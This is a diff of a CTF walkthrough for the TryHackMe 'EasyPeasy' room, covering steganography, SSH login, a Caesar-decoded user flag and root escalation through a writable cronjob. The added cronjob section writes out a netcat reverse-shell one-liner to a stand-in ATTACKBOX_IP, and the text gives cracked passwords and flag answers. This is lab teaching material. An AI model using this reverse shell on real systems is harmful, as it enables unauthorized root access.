@@ -173,6 +173,8 @@ After some trial and error, I was able to determine that the hash was a GOST has
 what is the password?**
 **Answer: mypasswordforthatjob**
 
+#### Step 3: Steganography
+
 Some gobuster enumeration revealed no results, so I determined there was probably something fishy to do with the image. So I downloaded it onto my attackbox and ran steghide extraction on it. `steghide extract -sf index.png`  
 `extract` specifies that we want to extract hidden information from the file. `-sf` specifies the file that we want to extract the information from. More information can be found on the steghide [man page](https://steghide.sourceforge.net/documentation/manpage.php).  
 
@@ -187,6 +189,8 @@ Let's have a look at what steghide has to offer.
 These results look promising. It looks like the password is in binary, let's deobfuscate that real quick.  
 
 ![Binary Conversion](/resources/easypeasy/binaryconversion.png)  
+
+#### Step 4: SSH
 
 **Question 6: What is the password to login to the machine via SSH?**  
 **Answer: iconvertedmypasswordtobinary**  
@@ -205,11 +209,48 @@ Cool! A text document. To view its contents, I'll run `cat user.txt`.
 
 ![user.txt](/resources/easypeasy/usertxtresults.png)  
 
-These results look... weird. Following the flag convention that we've seen before the first four letters should be flag. It's most likely a Caesar Cipher. So let's run this through a decoder and see what we get.
+These results look... weird. Following the flag convention that we've seen before the first four letters should be flag. It's most likely a Caesar Cipher. So let's run this through a [decoder](https://www.dcode.fr/caesar-cipher) and see what we get.
 
 ![usertxt Decoded](/resources/easypeasy/usertxtdecoded.png)  
 
 **Question 7: What is the user flag?**  
 **Answer: flag{n0wits33msn0rm4l}**  
 
-At this point, I was a bit stuck. The question implies that we need root access but I wasn't sure what to do. The description of the room mentioned cronjobs, but I had no clue how to exploit it so I took a look at [this writeup](https://github.com/iLinxz/CTF-Walkthroughs/blob/TryHackMe/TryHackMe%23EasyPeasy.pdf) by iLinxz. You can take a look at their writeup or see my explanation below for the process.
+#### Step 5: Cronjob
+
+At this point, I was a bit stuck. The question implies that we need root access but I wasn't sure what to do. The description of the room mentioned cronjobs, but I had no clue how to exploit it so I took a look at [this writeup](https://github.com/iLinxz/CTF-Walkthroughs/blob/TryHackMe/TryHackMe%23EasyPeasy.pdf) by iLinxz. You can take a look at their write-up or see my explanation below for the process.  
+
+There's a vulnerability to do with cronjobs so I'm going to explore the `/etc` directory using this command: `ls /etc/ | grep -i "cron"`  
+This command will sort through the /etc/ directories and files and find all results that have the word "cron" in them. Here are the results below:  
+
+![/etc/ search](/resources/easypeasy/etcsearch.png)  
+
+anacrontab and crontab are files while the others are directories. I used cat on both and found that crontab had something interesting.  
+
+![crontab](/resources/easypeasy/crontab.png)  
+
+It looks like there's a bash file in `/var/www/` that gets run periodically specifically every minute. This looks like the cronjob vulnerability that we were looking for. I run nano on it using `nano /var/www/.mysecretcronjob.sh` since vim isn't installed on the machine and find that it is indeed writable. Eureka.  
+
+Now for some exploiting. We'll be setting up a Reverse Shell using netcat. To do that, we'll need to add this line `rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKBOX_IP 4444 >/tmp/f` to the `.mysecretcronjob.sh` file. Along with running the command `netcat -lvnp 4444` on our own machine, we'll have our reverse shell up and running the next time this cronjob is run. For more detailed breakdown of the commands click [here]().  
+
+After a bit of waiting, this is what I received on my netcat listener. I ran whoami to make sure it was working properly.  
+
+![Reverse Shell Success](/resources/easypeasy/netcatlisten.png)  
+
+Looks like we have root access! Now, let's go to the root home directory and find that flag. To do that we run `cd ~` and to check the directory we can run `ls`.  
+
+![Root Directory Fail](/resources/easypeasy/hiddenroot.png)  
+
+Hm. It seems like `ls` is not picking up anything. It might be a hidden file. Let's run `ls -al`. `-a` makes it so we can see hidden files and `-l` sets it to a long listing format.  
+
+![There it is!](/resources/easypeasy/rootexposed.png)    
+
+There we go. It should be in .root.txt so let's run `cat .root.txt` real quick and we should have this task over with.  
+
+![Flag 8](/resources/easypeasy/flag8.png)
+
+**Question 8:**  
+**Answer: flag{63a9f0ea7bb98050796b649e85481845}**  
+
+####Cronjob Detailed Breakdown
+
